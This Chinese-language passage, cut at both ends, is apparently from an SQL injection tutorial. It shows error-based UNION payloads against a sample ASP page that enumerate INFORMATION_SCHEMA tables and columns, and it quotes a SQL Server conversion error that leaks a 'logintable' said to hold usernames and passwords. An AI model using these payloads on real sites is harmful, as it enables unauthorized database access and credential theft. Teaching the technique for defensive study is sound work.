    UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--`。`Information_schema.tables`
    是一个存储服务器上其他表信息的表。


    SQL 命令：`SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES` 返回 `information
    schema.tables` 的第一个表名作为字符串（`nvarchar`），该字符串与 `id` 组合为 `int = >`。


    来自服务器的错误信息：

    ```

    Microsoft OLE DB Provider for ODBC Drivers error ''80040e07 '' [Microsoft] [ODBC
    SQL Server Driver] [SQL Server] Syntax error converting the nvarchar value ''logintable
    '' to a column of data type int.

    ```

    `/Mypage.asp`，第 5 行。在错误信息中，我们知道一个名为 `''logintable ''` 的表。包含用户名和密码。


    查询的后续 SQL 代码：`http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 COLUMN_NAME
    FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = ''logintable '' -`。类似于 `information
    schema.tables`，`information schema.columns` 包含所有列名，并与 `id = 45`（`int` 类型）组合。返回错误信息：

    ```

